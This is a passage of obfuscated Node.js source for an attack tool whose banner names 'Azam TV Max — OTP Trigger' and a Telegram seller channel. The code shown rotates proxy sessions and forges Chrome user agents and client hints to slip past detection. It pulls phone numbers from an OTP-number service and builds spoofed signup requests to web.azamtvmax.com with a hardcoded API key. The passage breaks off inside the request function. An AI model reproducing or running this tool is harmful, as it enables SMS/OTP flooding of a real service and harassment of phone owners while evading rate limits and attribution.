'z2vYzq', 'Dg8GBG', 'wZeVmq', 'zgv0zq', 'revcvq', 'BMv0DW', 'DvvAwq', 'AufHCq', 'zw5N', 'EfnKsG', 'Ag8GiG', 'luvora', 's2L0lW', 'EeTSqW', 'zKTfta', 'EeLwEG', 'CIboDq', 'Cvv0CG', 'y3jLyq', 'y0DvCq', 'CxvLDq', 'yuH3Ba', 'ifbvqG', 'CI4Grq', 'vIbpva', 'u2f2zq', 'svjUCW', 'sMz5vG', 'uK9ysq', 'zfH1qq', 'Axr5ia', 'C3rYAq', 'Aw9Uia', 'BfjtEG', 'rMzzDG', 'Ag9IDa', 'zwLYyq', 'zKrSAW', 'CguGjW', 't3jYwG', 's0jIwG', 'yvLOta', 'shvtCG', 'xYaGlW', 'BhHqtW', 'BfrdsW', 's3PIsa', 'ANnVBG', 'BMCUia', 'mtG4lG', 'BNbTia', 'AhjVBq', 'vevgtW', 'C3rKBW', 'qM5SCq', 'u3vStq', 'g1SZsG', 'rM5mzq', 'zsbhzq', 'u1blua', 'AwH4AW', 'D3nCuW', 'suvcva', 'u2vSzq', 'qLvtzW', 'icGOja', 'rKjTwa', 'DgvY', 'j0Hlta', 'rwnyqq', 'sxnuta', 'Axnuva', 'yxrMBW', 'AwvZrG', 'C3nPBG', 'zNrwAq', 'BNrSEq', 'CgPmwq', 'Aw5JBa', 'q1qGua', 'BhzL', 'wM9QuG', 'yujAsW', 'EeTUta', 'CfLKCq', 'B3jTvG', 'zw50zq', 'qMjiAG', 'mtu1mgXuDhbbuG', 'twLJCG', 'B25YDG', 'wLPbqq', 'werlrW', 'zxbLBG', 'ifvoqq', 'rg9fza', 'zhnwrG', 'zgLNzq', 'twLzBG', 'ucbuCG', 'qLLTAq', 'tKjYvG', 'igLUCW', 'zsbUBW', 'ihnHDG', 'rgv0zq', 'z3vUEG', 'zw4Tvq', 'BNn0yq', 'C2HPzG', 'ucbuuG', 's2PuCW', 'yw0Gia', 'AMvOvW', 'uu1ryW', 'B0zkwq', 'mI9Nzq', '4Pwq4PwDcG', 'ywPmqW', 'mZyGka', 'ucbMBW', 'r3z2CW', 'D0zUyG', 'vufjEG', 'icPCka', 'CvnwqG', 'B0fgBa', 'Eg5xza', 'CM91BG', 'DgLUzW', 'lI4UcG', 'zwzoEG', 'ifnLCG', 'Bg9N', 'C3rVBq', 'vezQuq', 'ys1WBa', 'CgnVua', 'wg53BG', 'CMvZCW', 'vwf3rW', 'qMX5wa', 'C0P3uG', 'vwHhDa', 'AwXLza', 'z3jHEq', 'A0DAsW', 'CKfJDa', 'CMvUza', 'CxblAa', 'AYb0BW', 'igjHBa', 'CLjyra', 'DYbRzq', 'q0HrDq', 'CgfYCW', 'BwuVCW', 'qK9oBW', 'zxiGmq', 'zcbZyq', 'BcbuAq', 'tun4wG', '8j+tHcbUDq', '4PYtifrO', 'q0D4yq', 'AKrcsq', 'iefqsq', 'zgfwDW', 'shzHzW', 'Ew5J', 'uKzsAq', 'mJmZndzeyLvTr1O', 'zw4GBa', 'idePlG', 'rLrLta', 'AKTdtq', 'zM9iqG', 'mtj8mq', 'wePevq', 'q3zWCa', 'EvnMsG', 'yxLJua', 'AuHfyW', 'zLn3ta', 'B0vjyW', 'CM4GDa', 'tM1ABG', 'EufgvG', 'zwnKnG', 'tw96Aq', 'lIbuyq', 'vhnYAq', 'v0rksG', 'ChqTBa', 'Ew15ua', 'zgz5EG', 'BwuIoW', 'DgvNCG', 'C3nPBW', 'zwqGAW', 'mtfeBg5YBxe', 'quTiAq', 'j2jHyW', 'uMf0zq', 'qKLrDq', 'tMnZra', 'v3jPDa', 'BKDKsq', 's0PrvG', 'CIbJDq', 'q1n4vW', 'rurzta', 'yxrPBW', 'oLWNjW', 'ywjSzq', 's1zmza', 'zcaI', 'BNPHBa', 'vwLPDq', 't0zJqG', 'Bw9Kzq', 'mLz3qq', 't1mI', 'B0jJyG', 'CMvZBW', 'Egngtq', 'v2H3vG', 'B20Gta', 'l3nJCG', 'yKDZwG', 'DgvTua', 'Ag9ZDa', 'y3j5Ca', 'q296va', 'AwnLBG', 'xYaGia', 'BLnpqG', 'AxvcCa', 'Dg11BG', 'yLD4ua', 'rwHYEa', 'vM1sva', 'qwDLBG', 'vMn2sa', '4Psu4Psa4Psa4Psa', 'FdH8mq', 'rePHrq', 'kee7qG', 'uhfssa', 'zwqGDa', 'sLHIva', 'xZCPia', 'zxi/', 'yv9HCa', 'Dgn5CG', 'DuveDG', 'qNzSEq', 'uvLesW', 'Ae5fvW', 'vunZEa', 'tLPgzG', 'AxrPBG', 'sgHkBa', 'z0Heuq', 'zMLSzq', 'yuDSEq', 'Aw50BW', 'qNzYEq', 'C2LpDG', 'z3HcEq', 'DKLAvG', 'vw1rCa', 'vNjLta', 'D0LKzG', 'A1vNAG', 'EgLLCW', 'BgLezq', 'xsbwzq', 'tevsva', 'EvbRrq', 'y29TCa', 'wKvNEq', 'tvn0AW', 'BNv2wq', 'rvHbia', 'uKnxBG', 'A2vUDG', 'zwfZzq', 'tLHdta', 'BNbKzG', 'AxqGua', 'zw5LCG', 'DeXctq', 'AxrLza', 'ChP5DG', 'EgvK', 'ANHMua', 'ienOCG', 'AgjzzG', 'q2LTsq', 'C2v0uW', 'zNvUyW', 'yw94AG', 'xsbB', 'rxvlEq', 'tcbtrq', 'FcbLyW', 'odG4', 'iIWGiG', 'CxDmCW', 'ic9Fia', 'DuzuCq', 'w1nfva', 'Egzquq', 'Aefmzq', 'AgLUzq', 'AfL0uq', 'D2zzzq', 'DMrOAW', 'mc4Wia', 'DNfPCa', 's2HvyG', 'lwfNzq', 'BxncvW', 'l3bPBG', 'BLjUyW', 'yxrJAa', 'BMvhDq', 'BNLhuG', 'CerwrW', 'B24G', 'C3rLBG', 'u1vWDG', 've1mla', 'B3v0', 'v2L0Aa', 'zfnNsa', 'zhLNyG', 'q1vssq', 'C3vJyW', 'zvvNsa', 'DLfwqW', 'Bsbozq', 'CxvPCG', 'zMv0yW', 'ke1HyW', 'y3v0Aq', 'twDKvG', 'DgvFCG', 'igvYCG', 'BgryuG', 'x18Gia', 'B2yGDa', 'CM94Eq', 'ls0Tlq', 'Aw9U', 'BMrgAq', 'uKrxqq', 'DwLUzG', 'sMHtra', 'Egfpva', 'BNrFAq', 'rgXwvq', 'DgfeuG', 'BIbpva', 'EuXNyW', 'zxjZAq', 'AufpwG', 'txbRqW', 'xsbtzq', 'BMvS', 'y3jVCW', 'Cffjwq', 'B05ssq', 'EKnrEq', 'CIbqCG', 'B3bywq', 'DgLVBG', 'Au5UCa', 'BMXVyq', 'zgvUyW', 'rxHPDa', 'zLfdyq', 'B0rADq', 'l2f1Da', 'ifbYBW', 'q2XQqG', 'mJm4mdaYCe9gtgPi', 'CMXsCW', 'zuPRsq', 'AxvTia', 'zLDkBa', 'tg9NAq', 'icbqCG', 'zxnZzG', 'rvHHuG', 'BhP5BG', 'txL2zG', 'pt09ia', 'DgHVCG', 'tuvXDq', 'z3jHCa', 'C3rHBa', 'ExrXDW', 'Axz5Ea', 'DffqvW', 'DMvYAq', 'zYaGia', 'q0nABq', 'zg9pBW', 'EhfpEG', 'vfKGqq', 'BgXHlW', 'qvjfxa', 'BNbtwq', 'vwXXwq', 'BvLnzW', 'DwXyCW', 'C1zqAG', 'sMXrvG', 'zwn0Aq', 'BgLUzq', 'D29YAW', 'EffPuW', 'CM4Gka', 'C3rHBG', 'u2vUDa', 'DMvKia', 'v0vQEq', 'DK1Zwq', 'zLzwra', 'Fe9uua', 'kfDPBG', 'z3LQEa', 'B3jPEG', 'v3rxuq', 'B3HPzq', 'oLTHlq', 'D2vIlG', 'if9FxW', 'rMfPBa', 'ENzQAW', 'Bwvtzq', 'zgLUua', 'EgH2CG', 'zKvSua', 'l3WGlW', 'ALjrzq', 'wKvLsq', 'zMLSDa', 'A3fZsq', 'B21LlW', 'keDLDa', 'ttPCuW', 'zxrjDa', 'x19FxW', 'wNrPDa', 'AgLZiG', 'AfDTBG', 'DxbKyq', 'zxmUia', 'DMD2sa', 'Aw5NlG', 'uNfYwa', 'BfPhtW', 'BMTtEq', 'CNnPBW', 'rwvWEG', 'CM0TDG', 'CLvpAa', 'Efn6Ca', 'B3DLCG', 'ifnLBa', 'rLLOyq', 'zxnZpW', 'Dcbjua', 'BMDLia', 'BK1zyq', 'C3bYsq', 'ifGGmq', 'Dgf0Dq', 'Bxr2Fa', 'u2LSzq', 'vNzoEq', 'C2vJqW', 'C3rwza', 'EKLvDG', 'As1Rzq', 'EhrjEa', 'BgX5iq', 'oYbxAq', 'B3vbCW', 'ienssq', 'y1reDG', 'zxiGmW', 'zsWGyG', 'AfvH', 'DhnxAq', 'rK1HzG', 'rfPLBa', 'y3LHBG', 'q3DSsq', 'rMnXAq', 'ntaGva', 'vuLiwa', 'zg5wAW', 'ie51Bq', 'AgvHza', 'DfXdCG', 'EKDdzq', 'x18GFa', 'igXPAW', 'DgvYia', 'DerxCW', 'rfPYsG', 'BIbWAq', 'vw5RBG', 'CwXHvG', 'CMv0CG', 'EsaODa', 'y3b1la', 'zeHitq', 'zgvMBa', 'ugnOrG', 'yY9JCa', 'ywDLBG', 'v29YAW', 'wgfPCW', 'ic9FlW', 'rKfuqq', 'DMvyuW', 'zs4UlG', 'AgnsEq', 'Ahr0Ca', 'ze1HEa', 'y2TVkq', 'uxL0Aa', 'vMvYAq', 'BgTJBa', 'mc05yq', 'zwzYqq', 'ifvWza', 'nZyYofryqKXouW', 'EfbLsa', 'rNrbBG', 'ntuYnJeYofHzzwPAAG', 'sg93ia', 'ifrVAW', 'BM9YBq', 'wLbltG', 'Cg9W', 'D0jPrW', 'ug9YAG', 'yMfZzq', 'zw9Yzq', 'y0Tbua', 'B21cEq', 'zvrUrq', 'y3b1CW', 'sw5ouq', 'CMvTzq', 'vxjtqG', 'CM9Yqq', 'vfziAq', 'Bhr2Aq', 'yLbusq', 'ywrLza', 'mtm3lG', 'CNrPBG', 'Cg5mCW', 'zLK9cG', 'Aw5Nia', 'DgfYDa', '4OYO77Ipien1', 'sgXLuG', 'igjHyW', 'ruL5ua', 'r1PttG', 'CMvTBW', 'B0rLrq', 'BuvtzW', 'BgvUzW', 'B3iGDa', 'veXisq', 'zwq2yG', 'q2PXua', 's0rzCG', 'vMn4rG', 'vvzAsq', 'DezcvW', 'wxffCq', 'iKDVBW', 'zM9YBq', 'DxHrtW', 'Dgn2Ba', 'B2DeEG', 'CMvXDq', 'y2LLCW', 'D2fYzq', 'EgL0Aq', 'ihnLCG', 'zxrJAa', 'zvnYBa', 'oue3', 'BNvTyG', 'tgvUzW', 'BMrLBG', 'r2vJAW', 'vNH6Aa', 'D1PwAq', 'zwqGCW', 'lNzPza', 't3rhCW', 'icbFxW', 'y3rYBa', 'qNHtBa', 'ksbBza', 'uKjJDa', 'CMvnwq', 'kev4Da', 'zM9wEq', 'psaOrW', 't21Qsa', 'vhzAyq', 'l3yXlW', 'weDdnW', 'zMXVDW', 'y2vZCW', 'uxHfqG', 'zxf1zq', 'ieeOqG', '4PscifVIGki', 'Exj2rG', 'C2Hutq', 'thHXva', 'zwjlAq', 'w0vsuG', 'zxzLBG', 'zs1pDq', 'zgvlDq', 'ENjOyW', 'zxvL', 'CgLWzq', 'CYbHBG', 'icdILze', 'ALDfCG', 'uhjLBq', 'wefIEa', 'wur0uW', 'Aw1jBG', 'z1vgDG', 'BuPADW', 'Ac1ZAq', 'zcbMCG', 'C2vHCG', 'u1rfuG', 'ywnO', 'EsbMBW', 'reLMAG', 'zY4UlG', 'ENfVuG', 'y3rLza', 'CNmGyq', 'sw5ZDa', 'sfPxCq', 'xsbuzq', 'CfDKCq', 'CMfZvW', 'pue/qG', 'z2H0', 'z0TcCa', 'oI8V', 'lYaVia', 'CMvKia', 'B25Zzq', 'su9fqG', 'C1blza', 'igfNyq', 'icdILiiG', 'DgL2zq', 'B3j0Aq', 'wKnttq', 'igzYBW', 'B2jQzq', 'mNWYFa', 'x3XFFa', 'ls0ktq', 'yKDAtG', 'BenVDq', 'zMzPyW', 'rM5nBq', 'tJbzBq', 'CM9Wzq', 'o0e9qG', 'BuXUBa', 'Dg9tDa', 'EwvZ', 'vwjuDa', 't0zuvW', 'icdILzRILza', 'wu1UqW', 'rNv5Bq', 'rMH4Ea', 'u3vJyW', 't2z6uG', 'y1LKEG', 'B3jT', 'mKXNBq', 'vujmsq', 'BvrnuW', 'DfzAyG', 'B3DUqW', 'uKTtBa', 'rgXRqG', 'z2TLwq', 'BNj4zG', 'C29Yia', 'tM8GAa', 'suf1rG', 'EMXAAW', 'BIbVCG', 'rYbtrq', 'xsbzBW', 'y2vjra', 'DwHOrG', 'ihWGlW', 'yNfsCa', 'Agv4', 'v2LUza', 'uNrZra', 'id09pq', 'tcWGBa', 'zxjFDa', 'zM9Yrq', 'y2nvyW', 'zwPeAa', 'BgfUzW', 'lI4U', 'mtaWia', 'B2nLCW', 'vNLhCW', 'CMXhyG', 'yxrLia', 'Aw5KBW', 'qKjhtG', 'yuvODG', 'y3vZDa', 'iJK5iG', 'ywXeAq', 'sKPwyG', 'yxrLCG', 'BIaGia', 'v1fcwq', 'DxnLCG', 'zxjUyq', 'yf9Fia', 'zxrLyW', 'CZOVlW', 'igTLEq', 'B3rWCW', 'vgHYzq', 'DNzitG', 'BhPquW', 'tM8Sia', 'DgHPCW', 'tgz4Aa', 'igXLyq', 'zxjfBG', 'BfzLuq', '4Ocuie9u', 'zw91Da', 'y2HLyW', 'vLrWyG', 'BwL1Bq', 'v2LKrq', 'lIbqBa', 'CML0Eq', 'vfvPuW', 'CgDJzG', 'r1HNza', 'EKTvta', 'BhqP', 'qwDJqG', 'quX0ua', 'iK5VDa', 'A0D4sW', 'drTBsW', 'q0fqta', 'C3LwEq', 'uhjVyW', 'BNnLza', 'zxf1Aq', 'z3jLzq', 'lIbfEa', 'y3qTtW', '4PYtifrH', 'wwfLsW', 'zLfPra', 'DJ0I', 'BYbNBW', 'r05Fvq', 'zxiGsW', 'DhyVBa', 'zxi7ia', 'zwqGBW', 'ie5Via', 'EK5yua', 'rgvPra', 'mY9Nzq', 'ms4WlG', 'BhriuG', 'B3iGka', 'DuDhBq', 'nZaW', 'mJr6rg1wBvC', 'CNzLCG', 'DgvYBG', 'thfRCa', 'lYaVxW', 'thPhqq', 'qwnJzq', 'wLbeqW', 'C21KBG', 'EhqVCa', 'g1Ti', 'DM91Aq', 'ywqGzG', 'C3rKAq', 'DvzxDq', 'icdINjmG', 'DNHVrq', 'wwvZla', 'igrPCG'];
  fn1 = function () {
    return v25;
  };
  return fn1();
}
const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v26) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v27 = {};
      v27.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v27), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v28) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt",
  DEBUG_FILE = "debug.txt";
function debugLog(v29, v30, v31) {
  try {
    {
      const v32 = new Date().toISOString(),
        v33 = '[' + v32 + "] [" + v29 + "] [" + v30 + ']\x0a' + (typeof v31 === "object" ? JSON.stringify(v31, null, 2) : String(v31)) + '\x0a' + '─'.repeat(80) + '\x0a';
      fs.appendFileSync(DEBUG_FILE, v33, "utf8");
    }
  } catch (v34) {}
}
const B = chalk.hex("#00C9A7");
const C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("    ___                       _____ _   __  "));
    console.log(B("   /   |____  ____ _____ ___ /_  __| | / /  "));
    console.log(C("  / /| /_  / / __ `/ __ `__ \\ / /  | |/ /   "));
    console.log(C(" / ___ |/ /_/ /_/ / / / / / // /   |   /    "));
    console.log(Y("/_/  |_/___/\\__,_/_/ /_/ /_//_/    |_|_|  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("Azam TV Max — OTP Trigger    ") + W('│'));
    console.log(W("│ [•] Version   : ") + B("AZTV-V1.0.0                  ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v35) {
    this.delayMs = v35;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v36) {
    return new Promise((v37, v38) => {
      {
        this.queue.push(async () => {
          try {
            v37(await v36());
          } catch (v39) {
            v38(v39);
          }
        });
        if (!this.processing) this._process();
      }
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      {
        const v40 = this.queue.shift();
        await v40(), await new Promise(v41 => setTimeout(v41, this.delayMs));
      }
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v42, v43, v44) {
  return new Promise((v45, v46) => {
    {
      const v47 = {};
      v47.range = v43, v47.format = "normal";
      const v48 = JSON.stringify(v47),
        v49 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v44 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v42,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v48)
          }
        },
        v50 = http.request(v49, v51 => {
          {
            let v52 = '';
            v51.on("data", v53 => v52 += v53), v51.on("end", () => {
              try {
                const v54 = JSON.parse(v52);
                v54.success && v54.number ? v45(v54.number.replace(/[^0-9]/g, '')) : v46(new Error(v54.error || "NexaOTP: No number returned"));
              } catch (v55) {
                v46(new Error("NexaOTP: Invalid response"));
              }
            });
          }
        });
      v50.on("error", v56 => v46(new Error("NexaOTP network: " + v56.message))), v50.setTimeout(10000, () => {
        v50.destroy();
        v46(new Error("NexaOTP: Timeout"));
      }), v50.write(v48), v50.end();
    }
  });
}
function normalizePhoneNumber(v57) {
  let v58 = v57.trim();
  if (!v58.startsWith('+')) v58 = '+' + v58;
  return v58;
}
const v1 = {};
v1.v = 0x7e, v1.buildMin = 0x194e, v1.buildMax = 0x1984, v1.grease = "\"Not/A)Brand\";v=\"8\"";
const v2 = {};
v2.v = 0x7f, v2.buildMin = 0x1985, v2.buildMax = 0x19d4, v2.grease = "\"Not)A;Brand\";v=\"99\"";
const v3 = {};
v3.v = 0x80, v3.buildMin = 0x19d5, v3.buildMax = 0x1a0b;
v3.grease = "\"Not;A=Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x81, v4.buildMin = 0x1a0c, v4.buildMax = 0x1a42, v4.grease = "\"Not=A?Brand\";v=\"8\"";
const v5 = {};
v5.v = 0x82, v5.buildMin = 0x1a43, v5.buildMax = 0x1a79, v5.grease = "\"Not?A_Brand\";v=\"99\"";
const v6 = {};
v6.v = 0x83, v6.buildMin = 0x1a7a, v6.buildMax = 0x1ab1, v6.grease = "\"Not_A Brand\";v=\"24\"";
const v7 = {};
v7.v = 0x84, v7.buildMin = 0x1ab2, v7.buildMax = 0x1b1e, v7.grease = "\"Not A(Brand\";v=\"8\"";
const v8 = {};
v8.v = 0x85, v8.buildMin = 0x1b1f, v8.buildMax = 0x1b55, v8.grease = "\"Not(A;Brand\";v=\"99\"";
const v9 = {};
v9.v = 0x86, v9.buildMin = 0x1b56, v9.buildMax = 0x1b88, v9.grease = "\"Not;A)Brand\";v=\"24\"";
const v10 = {};
v10.v = 0x87, v10.buildMin = 0x1b89, v10.buildMax = 0x1bbe, v10.grease = "\"Not)A=Brand\";v=\"8\"";
const v11 = {};
v11.v = 0x88, v11.buildMin = 0x1bbf, v11.buildMax = 0x1bee, v11.grease = "\"Not=A_Brand\";v=\"99\"";
const v12 = {};
v12.v = 0x89, v12.buildMin = 0x1bef, v12.buildMax = 0x1c23, v12.grease = "\"Not/A)Brand\";v=\"8\"";
const v13 = {};
v13.v = 0x8a, v13.buildMin = 0x1c24, v13.buildMax = 0x1c59, v13.grease = "\"Not)A;Brand\";v=\"99\"";
const v14 = {};
v14.v = 0x8b, v14.buildMin = 0x1c5a, v14.buildMax = 0x1c7d, v14.grease = "\"Not;A=Brand\";v=\"24\"";
const v15 = {};
v15.v = 0x8c, v15.buildMin = 0x1c7e, v15.buildMax = 0x1c9f, v15.grease = "\"Not=A?Brand\";v=\"8\"";
const v16 = {};
v16.v = 0x8d, v16.buildMin = 0x1ca0, v16.buildMax = 0x1cbe, v16.grease = "\"Not?A_Brand\";v=\"24\"";
const v17 = {};
v17.v = 0x8e, v17.buildMin = 0x1cbf, v17.buildMax = 0x1ce2, v17.grease = "\"Not_A Brand\";v=\"8\"";
const v18 = {};
v18.v = 0x8f, v18.buildMin = 0x1ce3, v18.buildMax = 0x1cf6, v18.grease = "\"Not A(Brand\";v=\"99\"";
const v19 = {};
v19.v = 0x90, v19.buildMin = 0x1cf7, v19.buildMax = 0x1cfd, v19.grease = "\"Not(A;Brand\";v=\"8\"";
const v20 = {};
v20.v = 0x91, v20.buildMin = 0x1cfe, v20.buildMax = 0x1d03, v20.grease = "\"Not;A)Brand\";v=\"24\"";
const v21 = {};
v21.v = 0x92, v21.buildMin = 0x1d04, v21.buildMax = 0x1d1b, v21.grease = "\"Not)A=Brand\";v=\"99\"";
const v22 = {};
v22.v = 0x93, v22.buildMin = 0x1d1c, v22.buildMax = 0x1d35, v22.grease = "\"Not=A_Brand\";v=\"8\"";
const v23 = {};
v23.v = 0x94, v23.buildMin = 0x1d36, v23.buildMax = 0x1d49, v23.grease = "\"Not/A)Brand\";v=\"24\"";
const v24 = {};
v24.v = 0x95, v24.buildMin = 0x1d4a, v24.buildMax = 0x1d7d, v24.grease = "\"Not)A;Brand\";v=\"24\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23, v24];
(function () {
  const fn3 = function () {
    {
      let v60;
      try {
        v60 = Function('return (function() {}.constructor("return this")( ));')();
      } catch (v61) {
        v60 = window;
      }
      return v60;
    }
  };
  const v59 = fn3();
  v59.setInterval(fn2, 3500);
})();
function getRandomClient() {
  const v62 = CHROME_VERSIONS,
    v63 = Math.random() < 0.6,
    v64 = v63 ? v62.slice(10) : v62;
  const v65 = v64[Math.floor(Math.random() * v64.length)],
    v66 = Math.floor(Math.random() * (v65.buildMax - v65.buildMin + 1)) + v65.buildMin,
    v67 = Math.floor(Math.random() * 200) + 1;
  const v68 = Math.random() < 0.35,
    v69 = !v68 && Math.random() < 0.5;
  let v70, v71, v72;
  if (v68) v70 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v65.v + ".0." + v66 + '.' + v67 + " Safari/537.36", v71 = "\"macOS\"", v72 = "\"10.15.7\"";else v69 ? (v70 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v65.v + ".0." + v66 + '.' + v67 + " Safari/537.36", v71 = "\"Windows\"", v72 = "\"15.0.0\"") : (v70 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v65.v + ".0." + v66 + '.' + v67 + " Safari/537.36", v71 = "\"Windows\"", v72 = "\"10.0.0\"");
  const v73 = {};
  return v73.userAgent = v70, v73.secChUa = "\"Google Chrome\";v=\"" + v65.v + "\", \"Chromium\";v=\"" + v65.v + "\", " + v65.grease, v73.secChUaPlatform = v71, v73.secChUaPlatformVersion = v72, v73.chromeVersion = v65.v, v73;
}
function parseProxy(v74) {
  if (!v74) return null;
  if (typeof v74 === "object") return v74;
  v74 = v74.trim();
  if (!v74) return null;
  let v75, v76, v77, v78;
  if (v74.includes("://")) v74 = v74.split("://")[1];
  if (v74.includes('@')) {
    const v80 = v74.split('@'),
      v81 = v80[0].split(':'),
      v82 = v80[1].split(':');
    v77 = v81[0], v78 = v81[1], v75 = v82[0], v76 = parseInt(v82[1]);
  } else {
    const v83 = v74.split(':');
    if (v83.length === 2) v75 = v83[0], v76 = parseInt(v83[1]);else {
      if (v83.length === 4) !isNaN(parseInt(v83[3])) && isNaN(parseInt(v83[1])) ? (v77 = v83[0], v78 = v83[1], v75 = v83[2], v76 = parseInt(v83[3])) : (v75 = v83[0], v76 = parseInt(v83[1]), v77 = v83[2], v78 = v83[3]);else v83.length === 3 && (v75 = v83[0], v76 = parseInt(v83[1]), v77 = v83[2]);
    }
  }
  if (!v75 || !v76) return null;
  const v79 = {};
  v79.type = "http", v79.host = v75, v79.port = v76, v79.user = v77, v79.pass = v78, v79.original = v74;
  return v79;
}
function rotateSessionId(v84) {
  if (!v84 || !v84.user) return v84;
  const v85 = {
    ...v84
  };
  const v86 = v85;
  if (v86.user.includes("-ssid-")) {
    {
      const v87 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v86.user = v86.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v87);
    }
  } else {
    if (v86.user.includes("-session-")) {
      const v88 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v86.user = v86.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v88);
    } else {
      if (/_sid_/i.test(v86.user)) {
        const v89 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v86.user = v86.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v89);
      }
    }
  }
  return v86;
}
function createProxyAgent(v90) {
  if (!v90) return null;
  const v91 = typeof v90 === "string" ? parseProxy(v90) : v90;
  if (!v91) return null;
  let v92 = '';
  if (v91.type === "socks5" || v91.type === "socks4") {
    return v92 = "socks5://" + (v91.user ? encodeURIComponent(v91.user) + ':' + encodeURIComponent(v91.pass || '') + '@' : '') + v91.host + ':' + v91.port, new SocksProxyAgent(v92);
  } else return v92 = "http://" + (v91.user ? encodeURIComponent(v91.user) + ':' + encodeURIComponent(v91.pass || '') + '@' : '') + v91.host + ':' + v91.port, new HttpsProxyAgent(v92);
}
function sendRequest(v93, v94, v95, v96, v97 = null, v98 = 20000) {
  return new Promise((v99, v100) => {
    {
      const v101 = new URL(v93),
        v102 = {
          ...v95
        };
      let v103 = v102;
      if (!v103["Accept-Encoding"]) {
        v103["Accept-Encoding"] = "gzip, deflate, br";
      }
      if (v96) {
        v103["Content-Length"] = Buffer.byteLength(v96);
      }
      const v104 = {
        'hostname': v101.hostname,
        'path': v101.pathname + v101.search,
        'method': v94,
        'headers': v103,
        'timeout': v98
      };
      if (v97) {
        {
          const v106 = typeof v97 === "object" ? v97 : parseProxy(v97);
          if (!v106 || isNaN(v106.port) || v106.port <= 0) return v100(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
          v104.agent = createProxyAgent(v106);
        }
      }
      const v105 = https.request(v104, v107 => {
        {
          const v108 = [];
          v107.on("data", v109 => v108.push(v109)), v107.on("error", v100), v107.on("end", () => {
            {
              let v110 = Buffer.concat(v108);
              const v111 = v107.headers["content-encoding"];
              if (v111 === "gzip") try {
                v110 = zlib.gunzipSync(v110);
              } catch (v112) {} else {
                if (v111 === "deflate") try {
                  v110 = zlib.inflateSync(v110);
                } catch (v113) {} else {
                  if (v111 === 'br') try {
                    v110 = zlib.brotliDecompressSync(v110);
                  } catch (v114) {}
                }
              }
              v99({
                'status': v107.statusCode,
                'data': v110.toString("utf8"),
                'headers': v107.headers
              });
            }
          });
        }
      });
      v105.on("error", v100), v105.on("timeout", () => {
        v105.destroy(), v100(new Error("timeout"));
      });
      if (v96) v105.write(v96);
      v105.end();
    }
  });
}
async function triggerOTP(v115, v116 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      timeout = 20000,
      flowType = "SIGN_UP"
    } = v116,
    v117 = normalizePhoneNumber(v115),
    v118 = getRandomClient(),
    v119 = {};
  v119.accept = "application/json, text/plain, */*", v119["accept-encoding"] = "gzip, deflate, br, zstd", v119["accept-language"] = "en-US,en;q=0.9", v119.authorization = "Bearer null", v119["content-type"] = "application/json", v119.language = "eng", v119.languagecode = "eng", v119.local = 'BD', v119.origin = "https://web.azamtvmax.com", v119.platform = "WEB", v119.priority = "u=1, i", v119.referer = "https://web.azamtvmax.com/", v119.requestcount = '0', v119["sec-ch-ua"] = v118.secChUa, v119["sec-ch-ua-mobile"] = '?0', v119["sec-ch-ua-platform"] = v118.secChUaPlatform, v119["sec-ch-ua-platform-version"] = v118.secChUaPlatformVersion, v119["sec-fetch-dest"] = "empty", v119["sec-fetch-mode"] = "cors";
  v119["sec-fetch-site"] = "cross-site", v119.tenant_identifier = "master", v119["user-agent"] = v118.userAgent, v119["x-api-key"] = "ed6becd6cd33";
  const v120 = v119;
  try {
